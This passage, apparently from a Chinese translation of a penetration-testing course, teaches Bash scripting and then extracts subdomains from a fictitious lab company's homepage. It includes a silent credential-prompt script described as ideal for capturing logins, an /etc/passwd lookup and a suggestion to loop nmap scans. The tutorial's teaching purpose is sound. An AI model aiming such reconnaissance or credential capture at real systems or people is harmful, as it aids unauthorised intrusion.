中执行的。\n\n这让我们清楚地看到，var1 和 var2 的第二次声明发生在子 shell 中，并没有像最初的声明那样改变当前 shell 中的值。\n\n### 参数\n\n并非所有的 Bash 脚本都需要参数。然而，了解 Bash 如何解释参数以及如何使用参数是非常重要的。我们已经执行了带有参数的 Linux 命令。例如，当我们运行 ls -l /var/log 命令时，-l 和 /var/log 都是 ls 命令的参数。\n\nBash 脚本也不例外，我们可以提供命令行参数并在我们的脚本中使用它们。\n\n```bash\nkali@kali:~$ cat ./arg.sh\n#!/bin/bash\n\necho \"The first two arguments are $1 and $2\"\n\nkali@kali:~$ chmod +x ./arg.sh\n\nkali@kali:~$ ./arg.sh hello there\nThe first two arguments are hello and there\n```\n\n我们创建了一个简单的 Bash 脚本，给它设置了可执行权限，然后带着两个参数运行它。$1 和 $2 的变量代表传递给脚本的第一个和第二个参数。让我们来探讨一些特殊的 Bash 变量。\n\n在调试脚本时，这些特殊的变量中的一些可能非常有用。例如，我们也许可以获得一个命令的退出状态，以确定它是否被成功执行。\n\n### 读取用户输出\n\n命令行参数是用户输入的一种形式，但是我们也可以用 read 命令在脚本运行时捕获交互式用户输入。在这个例子中，我们将使用 read 来捕获用户输入，并将其分配给一个变量。\n\n```bash\nkali@kali:~$ cat ./input.sh\n#!/bin/bash\n\necho \"Hello there, would you like to learn how to hack: Y/N?\"\n\nread answer\n\necho \"Your answer was $answer\"\n\nkali@kali:~$ chmod +x ./input.sh\n\nkali@kali:~$ ./input.sh\nHello there, would you like to learn how to hack: Y/N?\nY\nYour answer was Y\n```\n\n我们可以通过各种命令行选项来改变 read 命令的行为，两个最常用的选项包括 `-p` 和 `-s` ，前者允许我们指定一个提示，后者使用户的输入保持沉默。后者是捕获用户凭证的理想选择。\n\n```bash\nkali@kali:~$ cat ./input2.sh\n#!/bin/bash\n# Prompt the user for credentials\n\nread -p 'Username: ' username\nread -sp 'Password: ' password\n\necho \"Thanks, your creds are as follows: \" $username \" and \" $password\n\nkali@kali:~$ chmod +x ./input2.sh\n\nkali@kali:~$ ./input2.sh\nUsername: kali\nPassword:\nThanks, your creds are as follows: kali and nothing2see!\n```\n\n## if，Else，Elif 语句\n\n条件性语句允许我们提供不同的条件执行不同的操作。最常见的条件性 Bash 语句已经包括 if、else 和 elif。\n\nif 语句相对简单 `-it` 检查一个条件是否为真 `-but` 需要一个非常特定的语法。请仔细注意这个语法，特别是必要的空格的使用：\n\n```bash\nif [ <some test> ]\nthen\n\t<perform an action>\nfi\n```\n\n在这个列表中，如果“一些测试”评估为真，脚本将“执行一个动作”，或者在 then 和 fi 之间的任何命令。我们来看看一个实际的例子。\n\n```bash\nkali@kali:~$ cat ./if.sh\n#!/bin/bash\n# if statement example\n\nread -p \"What is your age: \" age\n\nif [ $age -lt 16 ]\nthen\n echo \"You might need parental permission to take this course!\"\nfi\n\nkali@kali:~$ chmod +x ./if.sh\n\nkali@kali:~$ ./if.sh\nWhat is your age: 15\nYou might need parental permission to take this course!\n```\n\n在这个例子中，我们用一个 if 语句来检查用户输入的年龄。如果输入的年龄小于（-lt）16 岁，脚本将输出一条警告信息。\n\n上面 if 语句中的方括号（”[” 和 “]”）实际上是对 test 命令的引用。这只是意味着我们可以使用测试命令所允许的所有运算符。一些最常见的运算符包括：\n\n考虑到上述情况，我们之前使用 if 的例子可以不加方括号改写如下：\n\n```bash\nkali@kali:~$ cat ./if2.sh\n#!/bin/bash\n# if statement example 2\n\nread -p \"What is your age: \" age\n\nif test $age -lt 16\nthen\n echo \"You might need parental permission to take this course!\"\nfi\n\nkali@kali:~$ chmod +x ./if2.sh\n\nkali@kali:~$ ./if2.sh\nWhat is your age: 15\nYou might need parental permission to take this course!\n```\n\n尽管这个例子与使用方括号的例子在功能上是等同的，但使用方括号使代码稍稍容易阅读。\n\n我们还恶意在语句为真时执行某一组动作，在语句为假时执行另一组动作。要做到这一点，我们可以使用 else 语句，它的语法如下：\n\n```bash\nif [ <some test> ]\nthen\n\t<perform action>\nelse\n\t<perform another action>\nfi\n```\n\n让我们扩展我们之前的“年龄”例子，包括 else 语句。\n\n```bash\nkali@kali:~$ cat ./else.sh\n#!/bin/bash\n# else statement example\n\nread -p \"What is your age: \" age\n\nif [ $age -lt 16 ]\nthen\n\techo \"You might need parental permission to take this course!\"\nelse\n\techo \"Welcome to the course!\"\nfi\n\nkali@kali:~$ chmod +x ./else.sh\n\nkali@kali:~$ ./else.sh\nWhat is your age: 21\nWelcome to the course!\n```\n\n请注意，当输入的年龄大于（或更确切地说是“不小于”）16 岁时，执行 else 语句。\n\nif 和 else 语句只允许两个代码执行分支。我们可以用 elif 语句增加额外的分支，elif 语句使用以下模式：\n\n```bash\nif [ <some test> ]\nthen\n\t<perform action>\nelif [ <some test> ]\nthen\n\t<perform different action>\nelse\n\t<perform yet another different action>\nfi\n```\n\n让我们再次扩展我们的“年龄”例子，包括 elif 语句：\n\n```bash\nkali@kali:~$ cat ./elif.sh\n#!/bin/bash\n# elif example\n\nread -p \"What is your age: \" age\nif [ $age -lt 16 ]\nthen\n\techo \"You might need parental permission to take this course!\"\nelif [ $age -gt 60 ]\nthen\n\techo \"Hats off to you, respect!\"\nelse\n\techo \"Welcome to the course!\"\nfi\n\nkali@kali:~$ chmod +x ./elif.sh\n\nkali@kali:~$ ./elif.sh\nWhat is your age: 65\nHats off to you, respect!\n```\n\n在这个例子中，代码的执行流程稍微复杂一些。按照操作顺序，如果输入的年龄小于 16 岁，则执行 then 分支；如果年龄大于 60 岁，则进入 elif 分支（并显示 “Hats off.”）；else 分支只在年龄大于 16 岁 但小于60岁时执行。\n\n## 布尔逻辑操作\n\n布尔逻辑运算符，如 AND（&&）和 OR（||），有点神秘，因为 Bash 以各种方式使用它们。\n\n一个常见的用法是在命令列表中，这是命令链，其流程由运算符控制。“|”（管道符）符号是命令列表中常用的运算符，它将一个命令的输出传递给另一个命令的输入。同样，布尔逻辑运算符根据前一个命令是否成功（或返回 True 或 0）或失败（返回 Flase 或非 0）来执行命令。我们先来看看 AND（&&）布尔运算符，它只在前一个命令成功（或返回 True 或 0）的情况下执行一个命令。\n\n```bash\nkali@kali:~$ user2=kali\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\"\nkali:x:1000:1000:,,,:/home/kali:/bin/bash\nkali found!\n\nkali@kali:~$ user2=bob\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\"\n```\n\n在这个例子中，我们首先将我们要搜索的用户名分配给 user2 变量。接下来，我们使用 grep 命令检查某个用户是否在 /etc/passwd 文件中列出，如果是，grep 返回 True，echo 命令被执行。然而，当我们试图搜索一个我们知道不存在 /etc/passwd 文件中的用户时，我们的 echo 命令没有被执行。\n\n挡在命令列表中使用时，OR（||）运算符与 AND（&&）相反；它只在前一个命令失败（返回 False 或 非 0）时执行下一个命令。\n\n```bash\nkali@kali:~$ echo $user2\nbob\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\" || echo \"$user2 not found!\"\nbob not found!\n```\n\n在上面的例子中，我们把前面的命令更进一步，增加了 OR（||）运算符，后面是第二条 echo 命令。现在，当 grep 没有找到匹配的行并返回 False 时，就会执行 OR（||）操作符后的第二个 echo 命令。\n\n这些运算符也可以在测试中用来比较变量或其他测试的结果。当这样使用时，AND（&&）结合了两个简单的条件，如果它们都是真，结合的结果就是成功（或 True 或 0）。\n\n想一下这个例子：\n\n```bash\nkali@kali:~$ cat ./and.sh\n#/bin/bash\n# and example\n\nif [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]\nthen\n\techo \"Multiple statements are true!\"\nelse\n\techo \"Not much to see here...\"\nfi\n\nkali@kali:~$ chmod +x ./and.sh\n\nkali@kali:~$ ./and.sh\nMultiple statements are true!\n\nkali@kali:~$ echo $USER && echo $HOSTNAME\nkali\nkali\n```\n\n在这个例子中，我们用 AND（&&）来测试多个条件，由于两个变量的比较都是真的，整个 if 行都成功了，所以 then 分支执行。\n\n当在测试中使用时，OR (||) 布尔运算符被用来测试一个或多个条件，但只有其中一个条件为真才能算作成功。\n\n让我们看一个例子：\n\n```bash\nkali@kali:~$ cat ./or.sh\n#!/bin/bash\n# or example\n\nif [ $USER == 'kali' ] || [ $HOSTNAME == 'pwn' ]\nthen\n\techo \"One condition is true, this line is printed\"\nelse\n\techo \"You are out of luck!\"\nfi\n\nkali@kali:~$ chmod +x ./or.sh\n\nkali@kali:~$ ./or.sh\nOne condition is true, this line is printed\n\nkali@kali:~$ echo $USER && echo $HOSTNAME\nkali\nkali\n```\n\n在这个例子中，我们用 OR（||）来测试多个条件，由于其中一个变量的比较为真，整个 if 行成功了，所以 then 分支执行。\n\n## 循环\n\n在计算机编程中，循环帮助我们处理重复性的任务，我们需要运行这些任务直到满足某个标准。循环对于渗透测试人员来说特别有用，所以我们建议密切关注这一部分。\n\n在 Bash 中，两个最主要的循环命令是 for 和 while，我们将看到这两个命令。\n\n### For 循环\n\nFor 循环是非常实用的，在 Bash 单行程序中效果非常好。在这种类型的循环是用来对一个列表中的每个项目执行一组指定的命令。让我们简单地看一下它的一般语法：\n\n```bash\nfor var-name in <list>\ndo\n <action to perform>\ndone\n```\n\n这个 for 循环将取走列表中的每一个项目（按顺序），将该项目作为变量 var-name 的值，在 do 和 done 之间执行给定的动作，然后回到顶部，抓取列表中的下一个项目，重复这些步骤，直到列表用完。\n\n让我们看看一个更实用的例子，它将快速打印 10.11.1.0/24 子网中的前 10 个 IP 地址：\n\n```bash\nkali@kali:~$ for ip in $(seq 1 10); do echo 10.11.1.$ip; done\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\n在这个 Bash 单行程序中，我们使用 seq 命令来打印一个数字序列，在这里是 1 到 10 的数字。每个数字都被分配给 ip 变量，然后每个 IP 地址都被显示在屏幕上，for 循环运行多次，在系列的最后退出。\n\n另一种重写前面 for 循环的方法涉及到使用范围的括号扩展。使用范围的括号扩展写出了范围的第一个和最后一个值，可以是一个数字或字符的序列。这就是所谓的“序列表达式”。\n\n```bash\nkali@kali:~$ for i in {1..10}; do echo 10.11.1.$i;done\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\n这种类型的循环有很大的潜力。在屏幕上显示 IP 地址可能看起来不是很有用，但我们可以使用同样的循环，使用 nmap 运行端口扫描。我们还可以尝试使用 ping 命令，看看是否有任何 IP 地址对 ICMP 回波请求做出响应等等。\n\n### While 循环\n\nWhile 循环也相当常见，在表达式为真时执行代码。While 循环有一个简单的格式，和 if 一样，使用方括号（[]）来测试。\n\n```bash\nwhile [ <some test> ]\ndo\n <perform an action>\ndone\n```\n\n让我们用一个 while 循环来重新创建前面的例子。\n\n```bash\nkali@kali:~$ cat ./while.sh\n#!/bin/bash\n# while loop example\n\ncounter=1\n\nwhile [ $counter -lt 10 ]\ndo\n echo \"10.11.1.$counter\"\n ((counter++))\ndone\n\nkali@kali:~$ chmod +x ./while.sh\n\nkali@kali:~$ ./while.sh\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n```\n\n这不是我们预期的输出。这是一个常见的错误，叫做“偏一”错误。在上面的例子中，我们使用了 `-lt` （少于），而不是 `-le` （少于或等于），所以我们的计数器只到了 9，而不是原来的 10。\n\n((counter++)) 行使用双括号 (()) 结构，同时进行算数扩展和评估。在这个特殊的例子中，我们用它来增加我们的计数器变量 1。让我们重新写一下 while 循环，再试一下这个例子。\n\n```bash\nkali@kali:~$ cat ./while2.sh\n#!/bin/bash\n# while loop example 2\n\ncounter=1\n\nwhile [ $counter -le 10 ]\ndo\n echo \"10.11.1.$counter\"\n ((counter++))\ndone\n\nkali@kali:~$ chmod +x ./while2.sh\n\nkali@kali:~$ ./while2.sh\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\n很好，我们的 while 循环现在看起来好多了。\n\n## 函数\n\n在 Bash 脚本方面，我们可以把函数看作是脚本中的脚本，当我们需要在一个脚本中多次执行相同的代码时，这是很有用的。与其一次又一次地重写同一块代码，我们不如把它写成一个函数，然后根据需要调用这个函数。\n\n换句话说，函数是一个子程序，或一个实现一系列操作的代码块 `-a` 一个执行特定任务的“黑匣子”。函数可以用两种不同的格式来编写，第一种格式在 Bash 脚本中比较常见。\n\n```bash\nfunction function_name {\ncommands...\n}\n```\n\n第二种格式来 C 语言程序员来说更为熟悉。\n\n```bash\nfunction_name () {\ncommands...\n}\n```\n\n这些格式在功能上是相同的，是个人偏好问题。让我们看一个简单的例子：\n\n```bash\nkali@kali:~$ cat ./func.sh\n#!/bin/bash\n# function example\n\nprint_me () {\n echo \"You have been printed!\"\n}\n\nprint_me\n\nkali@kali:~$ chmod +x ./func.sh\n\nkali@kali:~$ ./func.sh\nYou have been printed!\n```\n\n函数也可以接受参数。\n\n```bash\nkali@kali:~$ cat ./funcarg.sh\n#!/bin/bash\n# passing arguments to functions\n\npass_arg() {\n echo \"Today's random number is: $1\"\n}\n\npass_arg $RANDOM\n\nkali@kali:~$ chmod +x ./funcarg.sh\n\nkali@kali:~$ ./funcarg.sh\nToday's random number is: 25207\n```\n\n在本例中，我们向函数传递了一个随机数 $RANDOM，该函数将其输出为 $1，即函数的第一个参数。请注意，函数定义（pass_arg()）包含括号。在其他编程语言中，例如 C，这些括号包含了预期的参数，但是在 Bash 中，括号只是作为装饰。它们从来不会被使用。还要注意的是，函数定义（函数本身）必须在脚本中出现，然后才会被调用。从逻辑上讲，我们不能调用我们没有定义的东西。\n\n<aside> 💡 使用描述性的函数名称，描述函数的目的。\n\n</aside>\n\n除了向 Bash 函数传递参数之外，我们当然也可以从 Bash 函数中返回值。Bash 函数实际上不允许你在传统意义上返回一个任意的值。相反，Bash 函数可以返回一个退出状态（零代表成功，非零表示失败）或者其他一些任意的值，我们可以随后从 $? 全局变量中访问这些值。另外，我们也可以在函数中设置一个全局变量，或者使用命令替换来模拟传统的返回。\n\n让我们看一个简单的例子，将一个随机数返回到 $?：\n\n```bash\nkali@kali:~$ cat funcrvalue.sh\n#!/bin/bash\n# function return value example\n\nreturn_me() {\n echo \"Oh hello there, I'm returning a random value!\"\n return $RANDOM\n}\n\nreturn_me\n\necho \"The previous function returned a value of $?\"\n\nkali@kali:~$ chmod +x ./funcrvalue.sh\n\nkali@kali:~$ ./funcrvalue.sh\nOh hello there, I'm returning a random value!\nThe previous function returned a value of 198\n\nkali@kali:~$ ./funcrvalue.sh\nOh hello there, I'm returning a random value!\nThe previous function returned a value of 313\n```\n\n注意，每次我们运行脚本时都会返回一个随机数，因为我们返回了特殊的全局变量 $RANDOM（变成了 $?）如果我们使用不带 $RANDOM 参数的返回语句，则会返回函数的退出状态（本例中为 0）。现在我们对变量和函数有了基本的了解，我们可以更深入地讨论变量范围。\n\n变量的范围就是它的意义所在的上下文。默认情况下，一个变量有一个全局范围，这意味着它可以在整个脚本中被访问。相反，局部变量只能在定义它的函数、代码块和子 Shell 中看到。我们可以“覆盖”一个全局变量，给它一个本底范围，方法是在声明前面加上 local 关键字，而不触动全局变量。一般的语法是：\n\n```bash\nlocal name=\"Joe\"\n```\n\n让我们通过一个简单的例子来看看局部变量和全局变量在实践中是如何工作的：\n\n```bash\nkali@kali:~$ cat ./varscope.sh\n#!/bin/bash\n# var scope example\n\nname1=\"John\"\nname2=\"Jason\"\n\nname_change() {\n local name1=\"Edward\"\n echo \"Inside of this function, name1 is $name1 and name2 is $name2\"\n name2=\"Lucas\"\n}\n\necho \"Before the function call, name1 is $name1 and name2 is $name2\"\n\nname_change\n\necho \"After the function call, name1 is $name1 and name2 is $name2\"\n\nkali@kali:~$ chmod +x ./varscope.sh\n\nkali@kali:~$ ./varscope.sh\nBefore the function call, name1 is John and name2 is Jason\nInside of this function, name1 is Edward and name2 is Jason\nAfter the function call, name1 is John and name2 is Lucas\n```\n\n首先注意到我们声明了两个全局变量，将 name1 设置为 John，name2 设置为 Jason。\n\n然后，我们定义了一个函数，并在该函数中声明了一个名为 name1 的局部变量，将其值设置为 Edward。由于这是一个局部变量，之前的全局赋值没有受到影响；在这个函数之外，name1 仍被设置为 John。\n\n接下来，我们将  name2 设置为 Lucas，由于我们没有使用局部关键字，我们正在改变全局变量，赋值在函数内部和外部都坚持。\n\n根据这个例子，以下两点总结了变量范围：\n\n- 改变一个与全局变量同名的局部变量的值不会影响其全局值。\n- 在一个函数中改变全局变量的值 -- 没有声明同名的局部变量 -- 将影响其全局值。\n\n## 实例\n\n到目前为止，我们已经涵盖了 Bash 脚本的基础知识。让我们把我们所讨论的所有概念放在一起，并通过一些实际的例子来说明。\n\n### Bash 的实际使用 —— 例子 1\n\n在这个例子中，我们想找到所有列在 [megacorpone.com](http://megacorpone.com) 主页上的子域，并找到他们相应的 IP 地址。手动操作太浪费时间了，但是通过一些基本的 Bash 命令，我们可以将其变成一项简单的任务。我们先用 `wget` 下载索引页。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# wget www.megacorpone.com\n--2022-03-30 02:53:08--  <http://www.megacorpone.com/>\n正在解析主机 www.megacorpone.com (www.megacorpone.com)... 149.56.244.87\n正在连接 www.megacorpone.com (www.megacorpone.com)|149.56.244.87|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：14603 (14K) [text/html]\n正在保存至: “index.html”\n\nindex.html             100%[============================>]  14.26K  1.46KB/s  用时 91s     \n\n2022-03-30 02:54:46 (160 B/s) - 已保存 “index.html” [14603/14603])\n\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# ls -l index.html        \n-rw-r--r-- 1 root root 14603 11月  6  2019 index.html\n```\n\n手动扫描该文件，我们看到许多我们不需要的行。让我们开始缩小我们需要的行的范围，并剔除我们不需要的行。首先，我们可以使用 grep “href=” 来提取 index.html 中所有包含 HTML 链接的行。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html                                                                                                                                                                                   130 ⨯\n    <link rel=\"shortcut icon\" href=\"assets/ico/favicon.ico\">\n    <link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n    <link href=\"assets/css/style.css\" rel=\"stylesheet\">\n    <link href=\"assets/css/font-awesome.min.css\" rel=\"stylesheet\">\n                <a class=\"navbar-brand\" href=\"index.html\">MegaCorp One</a>\n                    <li class=\"active\"><a href=\"//www.megacorpone.com/index.html\">HOME</a></li>\n                    <li><a href=\"<https://www.megacorpone.com/about.html>\">ABOUT</a></li>\n                    <li><a href=\"/contact.html\">CONTACT</a></li>\n                    <li><a href=\"<http://support.megacorpone.com>\">SUPPORT</a></li>\n                    <!--<li><a href=\"<https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/>\">SUPPORT</a></li>-->\n                    <li><a href=\"<http://www.megacorpone.com/jobs.html>\">CAREERS</a></li>\n                    <!--<li><a href=\"<http://www.megacorpone.com/jobs2.html>\">CAREERS</a></li>-->\n                    <li><a href=\"<http://intranet.megacorpone.com>\">LOG IN</a></li>\n                    <!--<li><a href=\"<https://cp.megacorpone.net/>\">LOG IN</a></li>-->\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <li><a href=\"<http://admin.megacorpone.com/admin/index.html>\">Cell Regeneration</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com/pear/>\">Immune Systems Supplements</a></li>\n                    <li><a href=\"<http://mail.megacorpone.com/menu/>\">Micromachine Cyberisation Repair</a></li>\n                    <li><a href=\"<http://mail2.megacorpone.com/smtp/relay/>\">Nanomite Based Weaponry Systems</a></li>\n                    <li><a href=\"<http://siem.megacorpone.com/home/>\">Nanoprobe Based Entity Assimilation</a></li>\n                    <li><a href=\"<http://support.megacorpone.com/ticket/requests/index.html>\">Nanoprocessors</a></li>\n                    <li><a href=\"<http://syslog.megacorpone.com/logs/sys/view.php>\">Perlin VanHook Chemical Dispersal</a></li>\n                <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <li><a href=\"<http://test.megacorpone.com/demo/index.php>\">What are the ethics behind MegaCorp One?</a></li>\n                    <li><a href=\"<http://vpn.megacorpone.com/diffie-hellman/>\">Is MegaCorp One being regulated by any goverment?</a></li>\n                    <li><a href=\"<http://www.megacorpone.com/aboutus.html>\">Where can I buy MegaCorp One products?</li>\n                                <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">Is there any environmental concerns related to nanotechnology?</a></li>\n                    <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">Can I suggest nanotechnology uses for the company to explore?</a></li>\n                    <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">What are the specs behind MegaCorpOne nanoprocessors?</a></li>\n                <p><a href=\"<http://admin.megacorpone.com/news/today.php>\">MegaCorp One acquires new round of funding.</a></p>\n                <p><a href=\"<http://beta.megacorpone.com/util/files/news.html>\">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>\n                <p><a href=\"<http://beta.megacorpone.com/util/files/news.html>\">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>\n                    <p><small>This is a fictitious company, brought to you by <a href=\"<https://www.offensive-security.com/>\" target=\"_blank\">Offensive Security</a>.</small></p>\n                        <a href=\"<https://www.facebook.com/MegaCorp-One-393570024393695/>\" target=\"_blank\"><i class=\"fa fa-facebook\"></i></a>\n                        <a href=\"<https://twitter.com/joe_sheer/>\"><i class=\"fa fa-twitter\"></i></a>\n                        <a href=\"<https://www.linkedin.com/company/18268898/>\" target=\"_blank\"><i class=\"fa fa-linkedin\"></i></a>\n                        <a href=\"<https://github.com/megacorpone>\" target=\"_blank\"><i class=\"fa fa-github\"></i></a>\n```\n\n在上面的摘录中，第一行是我们正在寻找的一个主要例子，因为它提到了一个子域。\n\n让我们使用 grep 来抓取包含 “.megacorpone.com” 的行，表示存在一个子域，并使用 `grep -v` 来剥离包含我们已经知道的无聊的 “[www.megacorpone.com](http://www.megacorpone.com)” 域名的行。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html | grep \".megacorpone\" | grep -v \"www.megacorpone.com\" | head\n                    <li><a href=\"<http://support.megacorpone.com>\">SUPPORT</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com>\">LOG IN</a></li>\n                    <!--<li><a href=\"<https://cp.megacorpone.net/>\">LOG IN</a></li>-->\n                    <li><a href=\"<http://admin.megacorpone.com/admin/index.html>\">Cell Regeneration</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com/pear/>\">Immune Systems Supplements</a></li>\n                    <li><a href=\"<http://mail.megacorpone.com/menu/>\">Micromachine Cyberisation Repair</a></li>\n                    <li><a href=\"<http://mail2.megacorpone.com/smtp/relay/>\">Nanomite Based Weaponry Systems</a></li>\n                    <li><a href=\"<http://siem.megacorpone.com/home/>\">Nanoprobe Based Entity Assimilation</a></li>\n                    <li><a href=\"<http://support.megacorpone.com/ticket/requests/index.html>\">Nanoprocessors</a></li>\n                    <li><a href=\"<http://syslog.megacorpone.com/logs/sys/view.php>\">Perlin VanHook Chemical Dispersal</a></li>\n```\n\n这个输出看起来更接近我们需要的东西。通过逻辑的方式减少我们的数据，并在每一次传递中依次进行更小的减少，我们正处于数据处理中最常见的循环之中。\n\n看起来每一行都包含一个链接和一个子域，但是我们需要摆脱我们的链接周围的额外 HTML。在 Bash 中执行的任何任务总是有多种方法，但我们将使用一个鲜为人知的方法来处理这个问题。我们将使用 awk 的 `-F` 选项来设置多字符定界符，这与 cut 不同，后者简单而方便，但只允许单字符定界符。我们将设置我们的分隔符为 http://，并告诉 awk 我们想要第二个字段（’{print $2}’），或者该分隔符之后的所有内容。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html | grep \".megacorpone\" | grep -v \"www.megacorpone.com\"|awk -F \"http://\" '{print $2}'\nsupport.megacorpone.com\">SUPPORT</a></li>\nintranet.megacorpone.com\">LOG IN</a></li>\n\nadmin.megacorpone.com/admin/index.html\">Cell Regeneration</a></li>\nintranet.megacorpone.com/pear/\">Immune Systems Supplements</a></li>\nmail.megacorpone.com/menu/\">Micromachine Cyberisation Repair</a></li>\nmail2.megacorpone.com/smtp/relay/\">Nanomite Based Weaponry Systems</a></li>\nsiem.megacorpone.com/home/\">Nanoprobe Based Entity Assimilation</a></li>\nsupport.megacorpone.com/ticket/requests/index.html\">Nanoprocessors</a></li>\nsyslog.megacorpone.com/logs/sys/view.php\">Perlin VanHook Chemical Dispersal</a></li>\ntest.megacorpone.com/demo/index.php\">What are the ethics behind MegaCorp One?</a></li>\nvpn.megacorpone.com/diffie-hellman/\">Is MegaCorp One being regulated by any goverment?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">Is there any environmental concerns related to nanotechnology?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">Can I suggest nanotechnology uses for the company to explore?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">What are the specs behind MegaCorpOne nanoprocessors?</a></li>\nadmin.megacorpone.com/news/today.php\">MegaCorp One acquires new round of funding.</a></p>\nbeta.megacorpone.com/util/files/news.html\">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>\nbeta.megacorpone.com/util/files/news.html\">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>\n```\n\n在我们的输出中，每一行的开头都表明我们在正确的轨道上。现在，我们可以用剪切法将分隔符设置为 “/”（用 -d），并打印第一个字段（用 -f 1），只留下完整的子域名称。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html | grep \"\\\\.megacorpone\" | grep -v \"www\\\\.megacorpone\\\\.com\" | awk -F \"http://\" '{print $2}'|cut -d \"/\" -f 1\nsupport.megacorpone.com\">SUPPORT<\nintranet.megacorpone.com\">LOG IN<\n\nadmin.megacorpone.com\nintranet.megacorpone.com\nmail.megacorpone.com\nmail2.megacorpone.com\nsiem.megacorpone.com\nsupport.megacorpone.com\nsyslog.megacorpone.com\ntest.megacorpone.com\nvpn.megacorpone.com\nwww2.megacorpone.com\nwww2.megacorpone.com\nwww2.megacorpone.com\nadmin.megacorpone.com\nbeta.megacorpone.com\nbeta.megacorpone.com\n```\n\n这看起来很好！然而，任何 Bash 大师看一眼我们的工作就会嗤之以鼻。那是应该的，因为我们以一种笨拙的方式使用了基本的工具，尽管我们的削减是相当合理的。Bash 及其相关的命令和内置程序是相当强大的，而且总是有更多的东西需要学习。\n\n如果我们对自己的工作进行批评，以努力改进（我们应该一直这样做），我们可能会看到一些简单的改进方法。首先，我们用 “href=” 开始搜索，后来又搜索了 http://。这两者本质上都是连接，但这要求每一行都有这两个字符串。如果某一行只有 http://，而没有 “herf=”，我们就会错过一行。应该避免冗余，特别是在处理大文件的时候。此外，我们并不真正关心链接，必然的，我们正在寻找以 “.megacorpone.com” 结尾的子域，而不管这个引用是否包含在一个链接中。\n\n另一件需要考虑的事情是，我们花了大量的时间和精力在搜索结果中寻找和分割出子域名称。这很笨拙，容易出错，而且毫无意义，因为形势良好的正则表达式搜索可以轻松处理这个问题。我们以前提到过正则表达式的为例，但是现在让我们看一个实际的例子，我们已经采取了解决这个问题的艰难途径。\n\n在这个例子中，我们将使用一个简单的正则表达式将 “.megacorpone.com” 子域从我们的文件中分割出来。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep -o '[^/]*\\\\.megacorpone\\\\.com' index.html | sort -u > list.txt\n                                                                                     \n┌──(root💀kali)-[~/Desktop]\n└─# cat list.txt                                                     \nadmin.megacorpone.com\nbeta.megacorpone.com\nintranet.megacorpone.com\nmail2.megacorpone.com\nmail.megacorpone.com\nsiem.megacorpone.com\nsupport.megacorpone.com\nsyslog.megacorpone.com\ntest.megacorpone.com\nvpn.megacorpone.com\nwww2.megacorpone.com\nwww.megacorpone.com\n```\n\n这个解决方案相当紧凑，但引入了一些新技术。首先，注意 `grep -o` 选项，它只返回我们正则表达式中定义的字符串。如果我们仔细的形成我们的表达式，这个单一的命令将处理我们之前的大部分数据雕刻。表达式本身看起来很复杂，但其实是相当直接的。\n\n我们要搜索的字符串 (’[^/]*.megacorpone.com’) 被包裹在单引号中，正如我们所提到的，单引号不允许变量扩展，并且会按字面意思处理所有被包围的字符。\n\n表达式中的第一个区块 ([^/]*) 是一个否定的 (^) 集合 ([])，它搜索不包括正斜杠的任何数量的字符 (*)。注意，句号用反斜杠 (\\.)转义的，以加强我们正在寻找一个字面的句号。接下来，该字符串必须以 “.megacorpone.com” 结束。当 grep 找到一个匹配的字符串时，它将把它从这一行中分割出来并返回。\n\n为了以后的使用，我们可以通过将其他字符包括在一个以逗号为限的列表中来否定列表。例如，这个块 ([^/,”]*) 将排除正斜杠和双引号字符。\n\n这是很多新的材料，可能看起来让人不知所措，但这是一个伟大的可重复使用的正则表达式，它可以找到任何在正斜杠之后以 “.megacorpone.com” 结尾的字符串，并尽职尽责的将 URL 引用的子域划出。我们以后可以重复使用这个正则表达式，从一个文件中分割出任何数量的字符串。\n\n我们本可以用这个正则表达式做得更多，但这是一个很好的开始，也是一个很好的例子，说明为什么正则表达式是如此有价值。\n\n现在我们有一个漂亮的、干净的、从 